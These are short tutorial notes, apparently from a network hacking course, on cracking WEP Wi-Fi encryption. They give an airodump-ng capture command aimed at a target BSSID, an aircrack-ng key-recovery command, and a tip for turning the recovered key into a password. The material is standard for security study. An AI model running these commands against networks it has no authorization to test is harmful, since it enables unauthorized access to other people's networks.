# Section 06 - Network Hacking - Gaining Access (WEP/WPA/WPA2 Cracking)

## WEP Cracking - Basic Case

Use `aircrack-ng` to analyze the data captured by `airodump-ng`.

First capture packets with:
```bash
airodump-ng --bssid=<BSSID> --channel=<CH> --write=basic_wep $IFACE
```

Let `airodump-ng` work for several seconds or several minutes to let `#Data` increase.

Run `aircrack-ng` against the captured packets with:
```bash
aircrack-ng basic_wep-01.cap
```

`aircrack-ng` outputs the key either as ASCII or as a key. If you only get the key, just remove the colons `:` to get a usable password.
